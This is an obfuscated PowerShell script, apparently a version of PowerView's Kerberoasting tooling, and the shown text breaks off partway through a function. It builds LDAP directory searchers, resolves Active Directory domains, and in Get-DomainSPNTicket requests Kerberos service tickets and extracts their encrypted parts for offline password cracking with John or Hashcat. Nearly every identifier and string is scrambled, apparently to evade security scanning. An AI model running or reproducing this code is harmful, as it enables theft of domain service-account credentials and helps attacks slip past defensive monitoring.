SEt  ('4'+'V1'+'qyb')  ([type]("{7}{3}{6}{4}{0}{5}{1}{2}"-F 'VIcES.reFeRRa','AS','ingOptiON','ysteM.DiREc','Er','LCH','TORYS','S')  ) ;  $zT1I= [TYpE]("{6}{4}{0}{2}{5}{3}{1}"-F 'I','S','rectoR','ITYmAsk','d','ysERVicES.seCUR','SYStEm.'); seT-item  VARiABLe:q8a7ip  (  [tYpE]("{0}{1}"-F 'Date','TIMe'))  ; set-Variable FUrCIk  (  [Type]("{3}{0}{5}{6}{4}{2}{1}" -F'sT','gs','nGfLA','SY','bIndi','eM.ReflEcTION','.')  ) ;  $53Lb =[TYpE]("{1}{4}{2}{6}{7}{5}{0}{10}{9}{3}{8}" -f'cTIvE','SyStE','RE','cTorY.DOMA','m.Di','rviCES.A','ctOR','yse','in','rE','Di');  SET-itEm ("vArIAB"+"Le:jd"+"1E"+"N4")  ( [TYpE]("{3}{1}{0}{4}{2}{5}" -f'FleCTi','e','Ssembl','r','oN.A','Y')  ) ;  Set-ItEM  VaRIaBLE:nbT  (  [tYpe]("{4}{0}{2}{3}{1}"-f'EM.','eR','b','itconVerT','sYST')  ) ; SET-ItEM ('vA'+'ri'+'aBlE'+':06z4c')  (  [TyPE]("{2}{0}{1}" -F'eR','T','COnv') );   sEt  81e40 ( [TYpe]("{0}{3}{2}{1}" -F 'b','erteR','cOnv','iT')) ;  $6ZNDa8  = [tYPE]("{6}{7}{2}{4}{8}{0}{1}{5}{3}" -f'MA','T','MeNT.AU','.pSCRedEntial','T','iOn','MANag','e','o')  ;
function G`eT`-DomainSE`A`RCHer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{4}{0}{1}" -f 'roc','ess','ould','PSSh','P'}, '')]
    [OutputType({"{4}{0}{3}{1}{2}{6}{5}"-f 'Dire','rv','ices.Directo','ctorySe','System.','er','rySearch'})]
    [CmdletBinding()]
    Param(
        [Parameter(vaLuEFROmpIpeLinE = ${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`M`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'er','Filt'})]
        [String]
        ${LD`ApFil`TeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`Ope`Rti`Es},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'h','Pat','ADS'})]
        [String]
        ${SEa`Rchb`ASE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Se`A`Rc`hBa`sEpReFix},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}{3}{4}"-f 'Controll','D','omain','e','r'})]
        [String]
        ${SEr`V`eR},

        [ValidateSet({"{0}{1}" -f 'B','ase'}, {"{0}{1}"-f 'OneLe','vel'}, {"{2}{1}{0}" -f 'ee','tr','Sub'})]
        [String]
        ${sEaRCH`Sc`o`Pe} = ("{1}{0}" -f'ubtree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ResuLt`PA`g`esIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`ER`V`ErtiMelIM`It} = 120,

        [ValidateSet({"{0}{1}" -f'Dac','l'}, {"{1}{0}" -f 'roup','G'}, {"{0}{1}" -f 'No','ne'}, {"{0}{1}" -f 'Owne','r'}, {"{0}{1}"-f 'S','acl'})]
        [String]
        ${S`e`CURiTym`AS`Ks},

        [Switch]
        ${ToMb`Sto`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creD`e`NTIaL} =  ( gcI  ('v'+'ARiABL'+'E:'+'6Z'+'nda8')  ).VaLUe::"EMp`Ty"
    )

    PROCESS {
        if (${psbO`U`NDP`AR`A`mEters}[("{0}{1}" -f 'Dom','ain')]) {
            ${tARG`eTDo`M`A`in} = ${d`O`mAIn}
        }
        else {
            
            if (${Ps`BO`U`N`DParAMEtE`RS}[("{0}{2}{1}" -f 'C','al','redenti')]) {
                ${Do`m`Ain`o`BjeCt} = &("{2}{3}{0}{1}" -f'-D','omain','Ge','t') -Credential ${c`R`ED`eNTial}
            }
            else {
                ${dom`Ai`NoBJ`eCt} = &("{0}{2}{1}"-f'Get-','main','Do')
            }
            ${TAr`geTDOm`A`iN} = ${doMA`Ino`Bj`e`ct}."n`AMe"
        }

        if (-not ${PS`Bou`N`dPaRAM`et`ers}[("{0}{1}"-f'S','erver')]) {
            
            try {
                if (${doMAi`NObj`eCT}) {
                    ${b`INDs`eRvER} = ${dOm`AI`NObJeCt}."pDCR`oLeo`W`NeR"."N`AmE"
                }
                elseif (${pS`BO`UNDpar`AmE`Te`Rs}[("{1}{0}{2}" -f 't','Creden','ial')]) {
                    ${B`I`NDsEr`Ver} = ((&("{0}{3}{1}{2}" -f 'G','D','omain','et-') -Credential ${cre`De`NtIAL})."PdcROl`e`oWN`Er")."n`AmE"
                }
                else {
                    ${B`In`DsE`RvEr} = ((&("{2}{1}{0}" -f 'n','-Domai','Get'))."P`DcRoLe`oWNEr")."N`AME"
                }
            }
            catch {
                throw ('['+'Ge'+'t'+'-DomainSearche'+'r] '+'Er'+'ror '+'in'+' '+'retr'+'i'+'eving'+' '+'P'+'DC '+'f'+'or '+'cur'+'rent '+'d'+'omain:'+' '+"$_")
            }
        }
        else {
            ${bIN`DS`e`RvER} = ${SEr`V`ER}
        }

        ${S`eaR`C`hstRING} = ("{2}{0}{1}"-f'P:','//','LDA')

        if (${Bin`DS`ER`Ver} -and (${bINDs`ERv`Er}.("{0}{1}" -f'Tri','m').Invoke() -ne '')) {
            ${Se`ARCh`ST`RinG} += ${biNDSe`R`VeR}
            if (${t`A`Rg`EtdOmaIn}) {
                ${sEAR`CHS`Tr`iNg} += '/'
            }
        }

        if (${PsbO`UndpA`Ra`M`eTErs}[("{2}{3}{1}{0}"-f 'ix','f','Searc','hBasePre')]) {
            ${sEArcHS`TRi`NG} += ${seaRc`hBa`sE`Pr`EfIX} + ','
        }

        if (${psB`ouNDp`A`RaMeT`ERs}[("{1}{2}{0}" -f'Base','Sea','rch')]) {
            if (${seAr`CH`BA`Se} -Match ("{0}{1}" -f'^GC:','//')) {
                
                ${dn} = ${SeARC`h`Ba`se}.("{0}{1}{2}"-f'T','o','Upper').Invoke().("{0}{1}"-f'T','rim').Invoke('/')
                ${searC`hSt`Ring} = ''
            }
            else {
                if (${se`ArChBa`Se} -match ("{0}{2}{1}"-f'^LD','://','AP')) {
                    if (${SE`ArC`hb`Ase} -match ("{0}{3}{1}{2}"-f'LDAP:','.','+/.+','//')) {
                        ${sE`AR`cHStR`I`Ng} = ''
                        ${dN} = ${sEAR`C`h`BASE}
                    }
                    else {
                        ${D`N} = ${S`Ear`ChBA`SE}.("{1}{3}{0}{2}"-f't','S','ring','ubS').Invoke(7)
                    }
                }
                else {
                    ${Dn} = ${sE`ARChb`ASe}
                }
            }
        }
        else {
            
            if (${Ta`R`gETdo`mA`IN} -and (${Ta`R`gET`dOMA`IN}.("{0}{1}" -f 'Tri','m').Invoke() -ne '')) {
                ${dN} = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        ${SEaRCH`s`Tri`Ng} += ${dN}
        &("{0}{2}{1}{3}" -f 'Wri','rbos','te-Ve','e') ('[Get-DomainS'+'ea'+'r'+'c'+'h'+'er] '+'s'+'ear'+'ch '+'str'+'i'+'ng: '+"$SearchString")

        if (${cre`denT`iAl} -ne  $6znda8::"em`ptY") {
            &("{0}{2}{1}"-f 'Wr','rbose','ite-Ve') ("{4}{9}{1}{6}{7}{5}{10}{3}{11}{8}{0}{2}" -f 's for LDA','-Do','P connection','ng altern','[G','ar','ma','inSe','al','et','cher] Usi','ate credenti')
            
            ${Do`MAi`No`BjeCT} = &("{1}{2}{0}" -f'ct','New-O','bje') ("{4}{7}{5}{3}{0}{1}{2}{6}{8}"-f 'es.Dir','ect','ory','ervic','Dir','ctoryS','En','e','try')(${s`eaRc`Hst`RIng}, ${cRE`d`E`NtiAl}."U`seRnaMe", ${cRe`d`ENtI`Al}.("{4}{0}{3}{6}{1}{5}{2}" -f'Cr','e','ial','e','GetNetwork','nt','d').Invoke()."paSSW`ORd")
            ${s`eARch`er} = &("{2}{0}{3}{1}" -f'ew-Ob','t','N','jec') ("{9}{7}{8}{4}{1}{5}{3}{2}{6}{10}{11}{0}"-f 'rcher','or','es.','rvic','ct','ySe','Dir','em.D','ire','Syst','ectory','Sea')(${doM`AiN`Ob`JECT})
        }
        else {
            
            ${s`EA`RChER} = &("{2}{0}{1}{3}"-f'-','O','New','bject') ("{3}{1}{9}{4}{5}{0}{2}{6}{7}{8}"-f'i','.DirectoryS','rector','System','rvic','es.D','ySea','r','cher','e')([ADSI]${s`EA`RCHst`RInG})
        }

        ${Se`ARC`HER}."pa`ges`iZe" = ${Res`ULTPages`I`Ze}
        ${SE`ArcH`ER}."S`eaRchs`C`oPe" = ${seARCHS`co`pE}
        ${sEA`Rc`HEr}."Ca`C`her`EsULtS" = ${f`ALse}
        ${S`eARch`ER}."Ref`erral`ch`AsIng" =   ( vAriaBle  ('4'+'V1'+'QYb')).vaLUe::"A`lL"

        if (${psbO`UNDPArAme`Te`Rs}[("{0}{2}{4}{3}{1}" -f'S','t','erverT','mi','imeLi')]) {
            ${s`EA`RCheR}."se`RveRT`i`MElIM`IT" = ${S`eRVe`R`Ti`m`eliMIt}
        }

        if (${p`s`BouNdpaRam`ETErS}[("{2}{1}{0}" -f 'ne','sto','Tomb')]) {
            ${se`A`RCHer}."tOM`BST`O`Ne" = ${Tr`Ue}
        }

        if (${P`SbOun`DpArAmE`TeRS}[("{2}{0}{1}"-f'DAP','Filter','L')]) {
            ${SE`A`RCHeR}."fil`TeR" = ${l`DAp`FIl`Ter}
        }

        if (${PSB`OUN`DpAramET`E`Rs}[("{2}{1}{0}{3}"-f'as','curityM','Se','ks')]) {
            ${sEaR`ch`ER}."seCURiTy`m`AS`ks" = Switch (${seCurIt`yMas`kS}) {
                ("{1}{0}"-f'cl','Da') {  (iTEM  ('VarIa'+'b'+'lE'+':'+'zT1i')).vALUE::"DA`CL" }
                ("{0}{1}" -f'Gr','oup') {   (  lS  VARiABlE:zt1i ).value::"gr`Oup" }
                ("{0}{1}" -f'Non','e') {  (Dir ('Va'+'R'+'Iable:ZT1I') ).VAlUE::"no`NE" }
                ("{1}{0}"-f 'r','Owne') {  ( Gi  VArIabLE:Zt1I).vAlue::"OWn`ER" }
                ("{1}{0}"-f'acl','S') {  $zT1I::"s`ACl" }
            }
        }

        if (${pS`Bo`UnDPa`RAmETERs}[("{1}{0}{2}"-f 'ert','Prop','ies')]) {
            
            ${ProP`ERTiESTo`L`oaD} = ${PRoPER`Ti`ES}| &("{1}{0}{2}{3}"-f'-Ob','ForEach','j','ect') { ${_}.("{1}{0}" -f 'lit','Sp').Invoke(',') }
            ${nU`ll} = ${sE`ArcHEr}."ProPErTIe`st`oLO`AD".("{2}{1}{0}"-f'e','ng','AddRa').Invoke((${prOp`eR`Ti`eStoLoAD}))
        }

        ${SEARCh`eR}
    }
}


function CONVert-`LDap`Pr`op`eRty {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}{3}{4}" -f 'PSShou','ldPr','oce','s','s'}, '')]
    [OutputType({"{8}{2}{5}{7}{1}{3}{6}{0}{4}"-f 'SCusto','nagement.Au','ys','tomation','mObject','te','.P','m.Ma','S'})]
    [CmdletBinding()]
    Param(
        [Parameter(mandAtory = ${t`RUE}, VAluefrompipelIne = ${T`RUE})]
        [ValidateNotNullOrEmpty()]
        ${PROp`ErT`IES}
    )

    ${O`Bj`ec`TpRoPE`R`TIeS} = @{}

    ${p`R`O`PErties}."PRO`pe`RtYnAmES" | &("{1}{4}{0}{3}{2}"-f'b','ForE','ect','j','ach-O') {
        if (${_} -ne ("{1}{0}{2}" -f 'at','adsp','h')) {
            if ((${_} -eq ("{0}{2}{1}" -f 'ob','tsid','jec')) -or (${_} -eq ("{2}{1}{0}" -f'y','histor','sid'))) {
                
                ${o`BJEct`proP`ertI`Es}[${_}] = ${pROp`Erti`Es}[${_}] | &("{3}{1}{2}{0}"-f 't','Obj','ec','ForEach-') { (&("{3}{2}{1}{0}"-f'ect','j','Ob','New-') ("{4}{0}{2}{7}{6}{8}{1}{3}{5}" -f '.Secu','e','rit','cu','System','rityIdentifier','n','y.Pri','cipal.S')(${_}, 0))."VaL`UE" }
            }
            elseif (${_} -eq ("{0}{1}{2}" -f'gro','upt','ype')) {
                ${ob`J`Ect`ProPErT`IeS}[${_}] = ${p`R`oPER`TieS}[${_}][0] -as ${Gro`UPtY`p`eENUm}
            }
            elseif (${_} -eq ("{4}{2}{0}{1}{3}" -f 'ty','p','amaccount','e','s')) {
                ${objECTpr`oP`e`RT`IEs}[${_}] = ${Pr`oP`ert`iEs}[${_}][0] -as ${sa`maCcOuN`T`TY`PEe`NUM}
            }
            elseif (${_} -eq ("{1}{0}{2}"-f'ct','obje','guid')) {
                
                ${oB`jE`C`T`p`RopERties}[${_}] = (&("{1}{2}{0}"-f 'ject','New-O','b') ("{1}{0}"-f 'id','Gu') (,${pr`opERtI`eS}[${_}][0]))."gu`Id"
            }
            elseif (${_} -eq ("{2}{4}{1}{3}{0}" -f'ntrol','ntc','useracc','o','ou')) {
                ${obje`CTP`Rop`eRtieS}[${_}] = ${pRO`P`ERTiES}[${_}][0] -as ${uaceN`Um}
            }
            elseif (${_} -eq ("{0}{3}{4}{2}{1}{6}{5}" -f'nts','escrip','d','ec','urity','or','t')) {
                
                ${DeS`cRIp`Tor} = &("{0}{2}{1}" -f 'New','t','-Objec') ("{12}{8}{4}{10}{5}{2}{11}{3}{6}{7}{0}{9}{1}"-f'tyDe','tor','a','e','curity.Acces','l.R','cu','ri','e','scrip','sContro','wS','S') -ArgumentList ${p`ROpe`RTI`Es}[${_}][0], 0
                if (${DESCR`i`PTor}."oWn`eR") {
                    ${ObJECt`P`RO`P`eRTiEs}[("{1}{0}" -f 'r','Owne')] = ${De`sCRi`pT`oR}."o`WnEr"
                }
                if (${d`EscR`iptoR}."GR`oUP") {
                    ${OBJec`TP`Ro`pE`RTieS}[("{0}{1}" -f 'Gr','oup')] = ${deSCR`Ip`ToR}."G`RoUP"
                }
                if (${DE`S`CRIPtoR}."Dis`creTiO`NarY`ACl") {
                    ${O`B`jEct`propER`TI`ES}[("{2}{0}{1}{3}"-f'ionary','A','Discret','cl')] = ${d`E`scr`IpTor}."D`Is`cR`EtIO`NArYaCL"
                }
                if (${DE`scri`p`Tor}."sYsteMA`CL") {
                    ${O`BJEc`Tp`RopErT`i`eS}[("{1}{0}{2}"-f 'm','Syste','Acl')] = ${DE`s`CRIptoR}."syStem`A`cl"
                }
            }
            elseif (${_} -eq ("{0}{1}{4}{2}{3}" -f'ac','c','n','texpires','ou')) {
                if (${PrOPerT`i`Es}[${_}][0] -gt   (  GCI varIabLE:Q8A7iP  ).vALuE::"MAX`Val`UE"."t`icKS") {
                    ${o`Bje`CTPRope`RtI`Es}[${_}] = ("{1}{0}" -f 'R','NEVE')
                }
                else {
                    ${ob`jEC`TPRopEr`T`IES}[${_}] =   (ChIlDiTEM VARiaBLE:q8A7Ip).ValUe::"frOM`F`IleTImE"(${pRo`peRt`IES}[${_}][0])
                }
            }
            elseif ( (${_} -eq ("{2}{1}{0}" -f 'ogon','tl','las')) -or (${_} -eq ("{0}{2}{1}{3}" -f 'l','tlogontime','as','stamp')) -or (${_} -eq ("{2}{1}{3}{0}" -f't','w','p','dlastse')) -or (${_} -eq ("{2}{1}{0}" -f'goff','astlo','l')) -or (${_} -eq ("{3}{1}{2}{0}{4}" -f'i','P','asswordT','bad','me')) ) {
                
                if (${PrO`PE`RTi`Es}[${_}][0] -is [System.MarshalByRefObject]) {
                    
                    ${TE`Mp} = ${pr`Op`eRtIES}[${_}][0]
                    [Int32]${H`IGh} = ${T`EMp}.("{1}{0}{2}"-f 'e','G','tType').Invoke().("{0}{2}{1}"-f'Invo','r','keMembe').Invoke(("{1}{0}{2}"-f'ighP','H','art'),   $FUrCik::"G`eT`pROperTy", ${N`UlL}, ${TE`mp}, ${n`ULL})
                    [Int32]${L`Ow}  = ${T`EmP}.("{1}{0}{2}"-f'et','G','Type').Invoke().("{3}{1}{0}{2}"-f 'em','nvokeM','ber','I').Invoke(("{0}{1}{2}" -f'LowP','a','rt'),   $furciK::"GET`p`RoP`ErTy", ${N`ULL}, ${T`eMP}, ${nU`Ll})
                    ${OB`jeC`T`P`ROpeRtiEs}[${_}] = ( $q8a7Ip::"fRO`mFIl`ETImE"([Int64]("0x{0:x8}{1:x8}" -f ${hi`GH}, ${l`OW})))
                }
                else {
                    
                    ${OBJECtPR`op`eRt`ieS}[${_}] = (  $q8a7IP::"fRo`MF`I`letiME"((${P`ROPer`T`IES}[${_}][0])))
                }
            }
            elseif (${ProP`erT`ies}[${_}][0] -is [System.MarshalByRefObject]) {
                
                ${PR`op} = ${pr`OP`eR`TiEs}[${_}]
                try {
                    ${T`eMP} = ${p`ROP}[${_}][0]
                    [Int32]${h`IGH} = ${TE`mp}.("{0}{2}{1}" -f 'Ge','ype','tT').Invoke().("{3}{0}{2}{1}" -f 'k','r','eMembe','Invo').Invoke(("{0}{2}{1}" -f 'HighPa','t','r'),   $FurciK::"gEtpRO`PER`TY", ${N`Ull}, ${tE`Mp}, ${nU`lL})
                    [Int32]${l`ow}  = ${t`emP}.("{1}{0}" -f'Type','Get').Invoke().("{1}{2}{0}{3}"-f 'embe','I','nvokeM','r').Invoke(("{1}{2}{0}"-f 'wPart','L','o'),   ( Get-VAriABLe  FURCik ).valUE::"GeTpr`Ope`RtY", ${n`ULl}, ${te`mP}, ${nu`Ll})
                    ${OB`jEcT`P`R`oPE`RTieS}[${_}] = [Int64]("0x{0:x8}{1:x8}" -f ${hI`Gh}, ${L`ow})
                }
                catch {
                    &("{0}{2}{1}" -f'Wr','ose','ite-Verb') ('[Conver'+'t'+'-'+'LDAPProp'+'ert'+'y] '+'erro'+'r:'+' '+"$_")
                    ${OB`j`ECTprOpe`RtIEs}[${_}] = ${Pr`op}[${_}]
                }
            }
            elseif (${p`RopERT`IEs}[${_}]."C`oUNt" -eq 1) {
                ${o`BJectPRo`p`e`RTIes}[${_}] = ${PROp`e`Rties}[${_}][0]
            }
            else {
                ${oBJeCTpRo`pE`R`TIEs}[${_}] = ${PrO`p`ErTi`ES}[${_}]
            }
        }
    }
    try {
        &("{2}{1}{0}" -f 'ect','bj','New-O') -TypeName ("{0}{1}"-f'PSOb','ject') -Property ${OB`JE`CtpropE`RTI`Es}
    }
    catch {
        &("{3}{1}{0}{2}" -f'arnin','-W','g','Write') ('[C'+'onvert-'+'L'+'D'+'AP'+'Property]'+' '+'Error'+' '+'pa'+'r'+'sing '+'L'+'DAP '+'propert'+'ies'+' '+': '+"$_")
    }
}


function gEt-Do`M`AiN {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(PoSItION = 0, vAluEfrompipeLine = ${tr`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${do`maiN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReD`entIal} =  (vAriAble  ('6z'+'nD'+'A8')  -VaL)::"eM`Pty"
    )

    PROCESS {
        if (${psBOu`NDPaRA`me`TeRS}[("{2}{0}{1}"-f'eden','tial','Cr')]) {

            &("{2}{3}{0}{1}"-f 'te-Ver','bose','W','ri') ("{5}{2}{9}{10}{0}{4}{12}{3}{6}{11}{8}{1}{7}"-f 'g','r Get-D','Get-Domain]','t',' alt','[','ia','omain','s fo',' ','Usin','l','ernate creden')

            if (${psB`Oun`dPA`RamETeRS}[("{2}{0}{1}"-f 'ma','in','Do')]) {
                ${TAr`Ge`Td`oMAIn} = ${domA`in}
            }
            else {
                
                ${T`A`Rg`E`TDoMAiN} = ${cRED`eNT`i`AL}.("{3}{1}{0}{2}"-f 'redentia','NetworkC','l','Get').Invoke()."DO`Ma`In"
                &("{1}{0}{2}" -f'erbo','Write-V','se') ('['+'Get-Do'+'ma'+'in] '+'Extr'+'act'+'ed'+' '+'doma'+'in '+"'$TargetDomain' "+'fro'+'m '+'-Cr'+'edenti'+'a'+'l')
            }

            ${dOm`AINCoNt`EXT} = &("{1}{2}{0}" -f'ject','New-','Ob') ("{10}{12}{1}{3}{0}{7}{11}{5}{8}{9}{6}{4}{2}" -f'ActiveD','rv','ext','ices.','nt','ory.Dire','o','i','ctory','C','System.Direct','rect','orySe')(("{0}{1}"-f'Do','main'), ${t`Ar`GEt`DoMain}, ${creDENT`i`AL}."U`s`ERNamE", ${cR`E`De`NTIAL}.("{3}{1}{5}{2}{4}{0}"-f 'l','rk','den','GetNetwo','tia','Cre').Invoke()."PAss`WORd")

            try {
                  (  vARiaBlE 53lb).VaLue::("{0}{1}"-f 'GetDom','ain').Invoke(${DomAiNC`O`N`TExt})
            }
            catch {
                &("{2}{0}{1}"-f 'Ver','bose','Write-') ('[Get'+'-'+'Domain] '+'The'+' '+'s'+'pe'+'cified '+'dom'+'ai'+'n '+"'$TargetDomain' "+'do'+'es '+'not'+' '+'exi'+'st,'+' '+'c'+'ould '+'n'+'ot '+'be'+' '+'co'+'nta'+'cted'+', '+'ther'+'e'+' '+('isngayt'+' ')."R`EplA`cE"('gay',[StrinG][chaR]39)+'an'+' '+'exi'+'stin'+'g '+'t'+'r'+'ust, '+'o'+'r '+'t'+'he '+'s'+'pec'+'ified '+'cred'+'e'+'ntials '+'are'+' '+'inv'+'a'+'lid: '+"$_")
            }
        }
        elseif (${PSb`o`Und`pA`RAmE`TErS}[("{1}{0}{2}"-f 'i','Doma','n')]) {
            ${d`OMAInCOnT`eXt} = &("{1}{2}{0}"-f't','New-Obje','c') ("{6}{4}{9}{10}{3}{11}{7}{2}{0}{1}{8}{5}"-f'.Di','recto','tory','e','.','yContext','System','Direc','r','DirectorySer','vic','s.Active')(("{0}{1}" -f'Do','main'), ${D`o`MAiN})
            try {
                  $53LB::("{1}{0}{2}" -f 'omai','GetD','n').Invoke(${dom`Ai`N`c`ONTExT})
            }
            catch {
                &("{2}{0}{1}" -f 'erbo','se','Write-V') ('[Get-Do'+'m'+'ai'+'n] '+'Th'+'e '+'sp'+'ec'+'ified '+'dom'+'ain'+' '+"'$Domain' "+'doe'+'s '+'not'+' '+'exi'+'st, '+'co'+'uld '+'no'+'t '+'b'+'e '+'contac'+'te'+'d, '+'or'+' '+'there'+' '+(('isnR'+'I'+'Vt ')  -REpLAcE ([ChAr]82+[ChAr]73+[ChAr]86),[ChAr]39)+'a'+'n '+'exi'+'s'+'ti'+'ng '+'t'+'rust '+': '+"$_")
            }
        }
        else {
            try {
                  (  gET-CHILDITEM  ('VaR'+'iAblE:53'+'lb') ).vaLUE::("{0}{2}{1}{3}" -f'Get','entDo','Curr','main').Invoke()
            }
            catch {
                &("{0}{3}{4}{2}{1}" -f'W','ose','rb','r','ite-Ve') ('[Get'+'-Domai'+'n]'+' '+'Error'+' '+'re'+'triev'+'ing '+'th'+'e '+'cu'+'rrent '+'do'+'main'+': '+"$_")
            }
        }
    }
}



function geT-dOmaI`Ns`pntic`K`et {
    [OutputType({"{2}{1}{0}{3}{4}" -f 'View','wer','Po','.SPNTic','ket'})]
    [CmdletBinding(dEFaultParAmeteRsetName = {"{0}{1}"-f'R','awSPN'})]
    Param (
        [Parameter(POsitIon = 0, pArAmEtERSEtNAme = "ra`WsPn", mAnDatoRY = ${tr`UE}, vaLuEFRomPipeLIne = ${tR`UE})]
        [ValidatePattern({"{0}{1}" -f '.*','/.*'})]
        [Alias({"{1}{0}{2}{3}" -f 'ice','Serv','Pri','ncipalName'})]
        [String[]]
        ${S`pN},

        [Parameter(POsItION = 0, paRAmEtERSEtName = "uS`Er", mANdaTory = ${t`RUE}, VAlUeFrOMPiPeLInE = ${TR`Ue})]
        [ValidateScript({ ${_}."pSOb`J`eCT"."TypE`NamES"[0] -eq ("{2}{3}{1}{0}" -f'er','s','PowerVie','w.U') })]
        [Object[]]
        ${Us`ER},

        [ValidateSet({"{0}{1}" -f 'Joh','n'}, {"{2}{1}{0}"-f't','hca','Has'})]
        [Alias({"{1}{0}"-f 'rmat','Fo'})]
        [String]
        ${Ou`TPut`F`oRmAT} = ("{0}{1}"-f 'Joh','n'),

        [ValidateRange(0,10000)]
        [Int]
        ${D`El`Ay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${ji`Tt`er} = .3,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRed`EN`TIAl} =  ( vaRIABle  ('6Z'+'nda'+'8') -VAlUEo )::"eMp`TY"
    )

    BEGIN {
        ${NU`Ll} =  $jD1EN4::("{0}{5}{3}{2}{4}{1}"-f'L','lName','t','r','ia','oadWithPa').Invoke(("{4}{2}{3}{5}{1}{0}"-f 'odel','tyM','d','en','System.I','ti'))

        if (${p`SBO`UNdpARaMeTE`RS}[("{2}{0}{1}" -f'a','l','Credenti')]) {
            ${LOG`O`NT`OKEn} = &("{0}{4}{5}{3}{1}{7}{6}{2}"-f 'Invo','pers','ion','erIm','ke-U','s','at','on') -Credential ${cRe`DEntI`AL}
        }
    }

    PROCESS {
        if (${pSbouN`dP`ArameTe`RS}[("{0}{1}" -f'Use','r')]) {
            ${TArg`e`Tob`J`ECt} = ${u`ser}
        }
        else {
            ${t`ARGE`TOBj`E`ct} = ${S`Pn}
        }
	
	${RAnd`No} = &("{0}{2}{1}"-f 'N','Object','ew-') ("{2}{1}{0}{3}{4}"-f'R','.','System','ando','m')

        ForEach (${o`Bject} in ${taRg`E`ToBJECt}) {

            if (${Ps`BoUND`Par`AmeTerS}[("{1}{0}" -f'er','Us')]) {
                ${USErs`Pn} = ${oBJ`E`cT}."SERV`I`c`EprI`NC`iPA`lnaME"
                ${SAm`A`CcO`UNTnAME} = ${OB`jEcT}."SaM`AC`cO`UntnAME"
                ${Dis`TIngU`ishEd`NAmE} = ${OBjE`ct}."dIstI`NguiSHe`d`NA`me"
            }
            else {
                ${uSe`RSpn} = ${O`B`jECT}
                ${Sam`ACco`UNtN`A`Me} = ("{0}{2}{1}" -f 'UNK','OWN','N')
                ${DistIN`GuIs`hEd`Na`Me} = ("{0}{2}{1}"-f'UNKN','N','OW')
            }

            
            if (${USe`Rs`pn} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${USer`s`pn} = ${uS`eRspN}[0]
            }

            try {
                ${T`Ic`KET} = &("{2}{1}{0}"-f't','ec','New-Obj') ("{3}{15}{12}{2}{14}{16}{13}{6}{8}{11}{5}{9}{1}{4}{0}{10}{7}"-f 'T','Securit','yM','Sy','y','equest','e','en','ro','or','ok','sR','.Identit','ens.Kerb','odel','stem','.Tok') -ArgumentList ${USe`RS`PN}
            }
            catch {
                &("{2}{3}{0}{1}"-f'n','g','Write-Wa','rni') ('['+'G'+'et-Do'+'mainSPNTic'+'ket] '+'E'+'rror'+' '+'reques'+'t'+'ing '+'tic'+'ket '+'f'+'or '+'SP'+'N '+"'$UserSPN' "+'from'+' '+'user'+' '+"'$DistinguishedName' "+': '+"$_")
            }
            if (${TI`C`Ket}) {
                ${t`ickE`Tb`YteSTR`eaM} = ${ti`cKet}.("{0}{1}{2}{3}"-f 'GetR','equ','es','t').Invoke()
            }
            if (${Ti`cKeTBY`T`e`stRe`Am}) {
                ${O`UT} = &("{3}{2}{0}{1}"-f 'j','ect','Ob','New-') ("{0}{1}{2}"-f'PSObj','ec','t')

                ${T`IcKeThexs`T`REAm} =  (  GI VARiabLE:nBT ).valUE::("{2}{0}{1}"-f 'o','String','T').Invoke(${ti`ckEtB`Yte`St`Re`AM}) -replace '-'

               
                if(${tIc`ke`T`H`ExstrEAm} -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    ${Et`YPE} =  (  Ls  ("V"+"aRiaBlE"+":0"+"6z4c") ).vaLUE::("{1}{0}"-f'te','ToBy').Invoke( ${ma`TC`HES}."Et`YPEl`eN", 16 )
                    ${cI`PheRTe`xt`LEn} =   (get-CHILDIteM ('VA'+'rI'+'aBlE'+':06Z4c')  ).VALuE::("{0}{1}" -f'ToUIn','t32').Invoke(${MA`TCHeS}."Cip`heRT`e`xtlen", 16)-4
                    ${cIPhEr`T`ext} = ${MA`TC`HEs}."dA`Ta`TOeNd".("{1}{2}{0}" -f 'tring','S','ubs').Invoke(0,${CI`p`h`erT`EXtlen}*2)

                    
                    if(${mAt`chES}."D`Atato`ENd".("{0}{1}{2}" -f'Subst','rin','g').Invoke(${ciP`hER`Te`XTLEn}*2, 4) -ne ("{1}{0}" -f'82','A4')) {
                        &("{1}{0}{3}{2}" -f '-W','Write','ng','arni') ('Erro'+'r '+'pa'+'r'+'sing '+'c'+'iph'+'ertex'+'t '+'for'+' '+'the'+' '+'SPN'+' '+' '+(('D'+'H3(D'+'H3Ticket.'+'S'+'e'+'r'+'vic'+'ePr'+'incipa'+'lName). ')  -replaCE  'DH3',[char]36)+'U'+'se '+'t'+'he '+'Ticke'+'tByt'+'eHex'+'Stream'+' '+'fi'+'el'+'d '+'and'+' '+'extra'+'c'+'t '+'t'+'he '+'h'+'ash '+'o'+'ffl'+'ine '+'with'+' '+('Ge'+'t-Kerber'+'oastH'+'a'+'shFro'+'mAPR'+'eq'+'BZ'+'U')."r`E`PlacE"(([Char]66+[Char]90+[Char]85),[sTRinG][Char]34))
                        ${h`Ash} = ${Nu`lL}
